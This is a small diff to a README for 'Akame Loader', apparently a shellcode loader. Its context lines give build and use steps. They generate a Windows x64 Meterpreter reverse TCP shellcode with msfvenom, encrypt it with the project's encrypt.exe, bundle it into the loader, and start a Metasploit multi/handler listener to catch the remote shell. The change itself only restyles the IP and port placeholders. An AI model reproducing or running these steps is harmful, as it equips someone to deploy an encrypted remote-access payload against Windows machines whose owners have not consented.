@@ -22,7 +22,7 @@ Icon: https://icon-icons.com/icon/Halloween-eye/109170
 
 ## Build instructions
 **1. Generate a shellcode with metasploit<br>**
-- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shellcode.bin
+- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=*IP* LPORT=*PORT* -f raw > shellcode.bin
 
 **2. Encrypt your shellcode with encrypt.exe<br>**
 - mv shellcode.bin \Akame Loader\x64\Release\Resources\ <br>
@@ -61,8 +61,8 @@ Icon: https://icon-icons.com/icon/Halloween-eye/109170
 - use exploit/multi/handler
 - set payload windows/x64/meterpreter/reverse_tcp
 - (optional) show options
-- set LHOST <IP>
-- set LPORT <PORT>
+- set LHOST *IP*
+- set LPORT *PORT*
 - exploit
 
 ## Video POC
